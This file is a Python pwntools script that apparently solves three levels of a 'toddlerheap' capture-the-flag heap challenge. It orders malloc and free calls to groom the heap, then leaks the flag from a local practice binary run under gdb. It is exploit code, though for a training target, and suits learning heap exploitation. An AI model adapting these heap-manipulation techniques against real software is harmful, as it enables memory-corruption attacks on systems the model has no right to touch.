#!/usr/bin/python3

from pwn import *

def prepare(p):
    p.recvuntil(b'quit): ')

def malloc_id(p, id, size):
    prepare(p)
    p.sendline(b'malloc')
    p.sendline(id)
    p.sendline(size)

def free_id(p, id):
    prepare(p)
    p.sendline(b'free')
    p.sendline(id)

def read_flag(p):
    prepare(p)
    p.sendline(b'read_flag')

def puts_id(p, id):
    prepare(p)
    p.sendline(b'puts')
    p.sendline(id)
    
def level1(p):
    for id in range(10):
        id_str = f'{id}'
        malloc_id(p, id_str.encode(), b'900')

    for id in range(9):
        id_str = f'{id}'
        free_id(p, id_str.encode())

    read_flag(p)
    puts_id(p, b'7')

def level2(p):
    for id in range(13):
        id_str = f'{id}'
        malloc_id(p, id_str.encode(), b'800')

    for id in range(9):
        id_str = f'{id}'
        free_id(p, id_str.encode())

    free_id(p, b'10') 
    free_id(p, b'11') 

    read_flag(p)
    puts_id(p, b'7')

def level3(p):
    malloc_id(p, b'0', b'1200')
    malloc_id(p, b'1', b'1100')
    malloc_id(p, b'2', b'2200')
    malloc_id(p, b'3', b'1100')
    free_id(p, b'0')
    free_id(p, b'2')

    read_flag(p)


level = 'level3.0'

p = gdb.debug(['./ld-2.35.so', '--preload', './libc.so.6', f'./toddlerheap_{level}'], '''
c            
''')
#p = process(f'/challenge/toddlerheap_{level}')

level3(p)
p.interactive()